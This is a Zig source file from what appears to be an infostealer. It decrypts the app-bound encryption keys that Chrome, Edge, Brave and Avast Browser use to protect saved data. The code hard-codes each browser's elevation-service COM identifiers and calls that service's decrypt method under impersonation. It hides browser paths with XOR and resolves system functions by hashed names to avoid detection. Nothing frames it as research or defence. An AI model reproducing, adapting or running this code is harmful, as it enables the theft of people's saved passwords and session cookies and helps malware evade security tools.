const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const dll_loader = @import("../crypto/dll_loader.zig");
const hash = @import("../types/hash.zig");
const export_resolve = @import("../types/export_resolve.zig");
const aes_gcm_bcrypt = @import("../crypto/aes_gcm_bcrypt.zig");

pub const BrowserType = enum {
    chrome,
    edge,
    brave,
    avast,
};

pub const ElevatorGuids = struct {
    clsid: [16]u8,
    iid_v1: [16]u8,
    iid_v2: ?[16]u8,
    process_name: []const u8,
    install_subdir: []const u8,
    user_data_subdir: []const u8,
};

const E = struct {
    pub const chrome_proc = hash.xorEncrypt("chrome.exe");
    pub const chrome_inst = hash.xorEncrypt("Google\\Chrome");
    pub const chrome_data = hash.xorEncrypt("Google\\Chrome\\User Data");
    pub const edge_proc = hash.xorEncrypt("msedge.exe");
    pub const edge_inst = hash.xorEncrypt("Microsoft\\Edge");
    pub const edge_data = hash.xorEncrypt("Microsoft\\Edge\\User Data");
    pub const brave_proc = hash.xorEncrypt("brave.exe");
    pub const brave_inst = hash.xorEncrypt("BraveSoftware\\Brave-Browser");
    pub const brave_data = hash.xorEncrypt("BraveSoftware\\Brave-Browser\\User Data");
    pub const avast_proc = hash.xorEncrypt("AvastBrowser.exe");
    pub const avast_inst = hash.xorEncrypt("AVAST Software\\Browser");
    pub const avast_data = hash.xorEncrypt("AVAST Software\\Browser\\User Data");
};

var _chrome_proc: [E.chrome_proc.len]u8 = undefined;
var _chrome_inst: [E.chrome_inst.len]u8 = undefined;
var _chrome_data: [E.chrome_data.len]u8 = undefined;
var _edge_proc: [E.edge_proc.len]u8 = undefined;
var _edge_inst: [E.edge_inst.len]u8 = undefined;
var _edge_data: [E.edge_data.len]u8 = undefined;
var _brave_proc: [E.brave_proc.len]u8 = undefined;
var _brave_inst: [E.brave_inst.len]u8 = undefined;
var _brave_data: [E.brave_data.len]u8 = undefined;
var _avast_proc: [E.avast_proc.len]u8 = undefined;
var _avast_inst: [E.avast_inst.len]u8 = undefined;
var _avast_data: [E.avast_data.len]u8 = undefined;
var _guids_init = false;

fn initGuids() void {
    if (_guids_init) return;
    hash.xorDecrypt(&E.chrome_proc, &_chrome_proc);
    hash.xorDecrypt(&E.chrome_inst, &_chrome_inst);
    hash.xorDecrypt(&E.chrome_data, &_chrome_data);
    hash.xorDecrypt(&E.edge_proc, &_edge_proc);
    hash.xorDecrypt(&E.edge_inst, &_edge_inst);
    hash.xorDecrypt(&E.edge_data, &_edge_data);
    hash.xorDecrypt(&E.brave_proc, &_brave_proc);
    hash.xorDecrypt(&E.brave_inst, &_brave_inst);
    hash.xorDecrypt(&E.brave_data, &_brave_data);
    hash.xorDecrypt(&E.avast_proc, &_avast_proc);
    hash.xorDecrypt(&E.avast_inst, &_avast_inst);
    hash.xorDecrypt(&E.avast_data, &_avast_data);
    _guids_init = true;
}

pub fn getGuids(browser: BrowserType) ElevatorGuids {
    initGuids();
    return switch (browser) {
        .chrome => .{
            .clsid = .{ 0xE0, 0x86, 0x08, 0x70, 0x41, 0xF6, 0x11, 0x46, 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B },
            .iid_v1 = .{ 0xCF, 0xBE, 0x3A, 0x46, 0x0D, 0x41, 0x7F, 0x40, 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8 },
            .iid_v2 = .{ 0x8B, 0x20, 0xF5, 0x1B, 0x5F, 0x29, 0x92, 0x49, 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 },
            .process_name = &_chrome_proc,
            .install_subdir = &_chrome_inst,
            .user_data_subdir = &_chrome_data,
        },
        .edge => .{
            .clsid = .{ 0x6C, 0xE9, 0xFC, 0x1F, 0x97, 0x16, 0xAF, 0x43, 0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67 },
            .iid_v1 = .{ 0x07, 0xB8, 0xC2, 0xC9, 0x31, 0x77, 0x34, 0x4F, 0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B },
            .iid_v2 = .{ 0x92, 0x67, 0x7B, 0x8F, 0x4D, 0x78, 0x47, 0x40, 0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05 },
            .process_name = &_edge_proc,
            .install_subdir = &_edge_inst,
            .user_data_subdir = &_edge_data,
        },
        .brave => .{
            .clsid = .{ 0xAF, 0x31, 0x6B, 0x57, 0x69, 0x63, 0x6B, 0x4B, 0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B },
            .iid_v1 = .{ 0x9E, 0x86, 0x96, 0xF3, 0x0E, 0x0C, 0x71, 0x4C, 0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9 },
            .iid_v2 = .{ 0x8B, 0x20, 0xF5, 0x1B, 0x5F, 0x29, 0x92, 0x49, 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 },
            .process_name = &_brave_proc,
            .install_subdir = &_brave_inst,
            .user_data_subdir = &_brave_data,
        },
        .avast => .{
            .clsid = .{ 0xE8, 0x34, 0xD3, 0xEA, 0x08, 0x8D, 0xA1, 0x4C, 0xAD, 0xA3, 0x64, 0x75, 0x43, 0x74, 0xD8, 0x11 },
            .iid_v1 = .{ 0x9F, 0xBB, 0x37, 0x77, 0xC1, 0xBA, 0x71, 0x4C, 0xA6, 0x96, 0x7C, 0x82, 0xD7, 0x99, 0x4B, 0x6F },
            .iid_v2 = null,
            .process_name = &_avast_proc,
            .install_subdir = &_avast_inst,
            .user_data_subdir = &_avast_data,
        },
    };
}

const CLSCTX_LOCAL_SERVER: u32 = 4;
const COINIT_APARTMENTTHREADED: u32 = 2;
const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFFFFFF;
const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFFFFFF;
const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;
const S_OK: i32 = 0;

const HRESULT = i32;
const ULONG = u32;

var g_ole32: types.PVOID = @as(types.PVOID, @ptrFromInt(@as(usize, 1)));
var g_CoInitializeEx: ?*const fn (?*const anyopaque, ULONG) callconv(.winapi) HRESULT = null;
var g_CoCreateInstance: ?*const fn (*const [16]u8, ?*const anyopaque, ULONG, *const [16]u8, ?*?*const anyopaque) callconv(.winapi) HRESULT = null;
var g_CoSetProxyBlanket: ?*const fn (?*const anyopaque, ULONG, ULONG, ?*const anyopaque, ULONG, ULONG, ?*const anyopaque, ULONG) callconv(.winapi) HRESULT = null;
var g_CoUninitialize: ?*const fn () callconv(.winapi) void = null;
var g_SysAllocStringByteLen: ?*const fn (?*const u8, ULONG) callconv(.winapi) ?*u16 = null;
var g_SysFreeString: ?*const fn (?*const u16) callconv(.winapi) void = null;

fn ensureCom() bool {
    if (@intFromPtr(g_ole32) != 1) return true;
    g_ole32 = dll_loader.getOrLoadDll("ole32.dll") orelse {
        g_ole32 = @as(types.PVOID, @ptrFromInt(@as(usize, 2)));
        return false;
    };

    const R = export_resolve.getFunctionByHash;
    g_CoInitializeEx = @ptrCast(@alignCast(R(g_ole32, hash.encryptedHashFunc("CoInitializeEx")) orelse return false));
    g_CoCreateInstance = @ptrCast(@alignCast(R(g_ole32, hash.encryptedHashFunc("CoCreateInstance")) orelse return false));
    g_CoSetProxyBlanket = @ptrCast(@alignCast(R(g_ole32, hash.encryptedHashFunc("CoSetProxyBlanket")) orelse return false));
    g_CoUninitialize = @ptrCast(@alignCast(R(g_ole32, hash.encryptedHashFunc("CoUninitialize")) orelse return false));
    g_SysAllocStringByteLen = @ptrCast(@alignCast(R(g_ole32, hash.encryptedHashFunc("SysAllocStringByteLen")) orelse return false));
    g_SysFreeString = @ptrCast(@alignCast(R(g_ole32, hash.encryptedHashFunc("SysFreeString")) orelse return false));
    return true;
}

pub fn decryptAppBoundKey(encrypted_key: []const u8, browser: BrowserType, out: []u8) ?[]u8 {
    if (!ensureCom()) return null;
    if (encrypted_key.len < 5) return null;
    if (out.len < 32) return null;

    const guids = getGuids(browser);
    const clsid = &guids.clsid;
    const iid = &guids.iid_v1;

    var hr = g_CoInitializeEx.?(null, COINIT_APARTMENTTHREADED);
    if (hr < 0) return null;
    defer g_CoUninitialize.?();

    const payload = if (encrypted_key.len > 4 and std.mem.eql(u8, encrypted_key[0..4], "APPB"))
        encrypted_key[4..]
    else
        encrypted_key;

    const bstr = g_SysAllocStringByteLen.?(@as(?*const u8, @ptrCast(payload.ptr)), @as(ULONG, @intCast(payload.len)));
    if (bstr == null) return null;
    defer _ = g_SysFreeString.?(bstr);

    var elevator: ?*const anyopaque = null;
    hr = g_CoCreateInstance.?(clsid, null, CLSCTX_LOCAL_SERVER, iid, @as(?*?*const anyopaque, @ptrCast(&elevator)));
    if (hr < 0 or elevator == null) return null;

    hr = g_CoSetProxyBlanket.?(
        elevator,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        null,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        null,
        EOAC_DYNAMIC_CLOAKING,
    );
    if (hr < 0) return null;

    const IElevatorVtbl = extern struct {
        query_interface: *const fn (*const anyopaque, *const [16]u8, ?*?*const anyopaque) callconv(.winapi) HRESULT,
        add_ref: *const fn (*const anyopaque) callconv(.winapi) ULONG,
        release: *const fn (*const anyopaque) callconv(.winapi) ULONG,
        run_recovery: *const fn (*const anyopaque, ?*const u16, ?*const u16, ?*const u16, ?*const u16, u32, ?*usize) callconv(.winapi) HRESULT,
        encrypt_data: *const fn (*const anyopaque, u32, ?*const u16, ?*?*u16, ?*u32) callconv(.winapi) HRESULT,
        decrypt_data: *const fn (*const anyopaque, ?*const u16, ?*?*u16, ?*u32) callconv(.winapi) HRESULT,
    };

    const obj_ptr = @as(*const anyopaque, @ptrCast(elevator.?));
    const vtbl = @as(*const IElevatorVtbl, @ptrCast(@as(*const *const IElevatorVtbl, @alignCast(@ptrCast(obj_ptr))).*));
    var plaintext_bstr: ?*u16 = null;
    var last_error: u32 = 0;
    hr = vtbl.decrypt_data(obj_ptr, @as(?*const u16, @ptrCast(bstr)), @as(?*?*u16, @ptrCast(&plaintext_bstr)), @as(*u32, @ptrCast(&last_error)));

    if (hr < 0 or plaintext_bstr == null) return null;

    const plain_bytes = @as([*]u8, @ptrCast(@alignCast(plaintext_bstr)))[0..32];
    @memcpy(out[0..32], plain_bytes);
    g_SysFreeString.?(plaintext_bstr);

    return out[0..32];
}
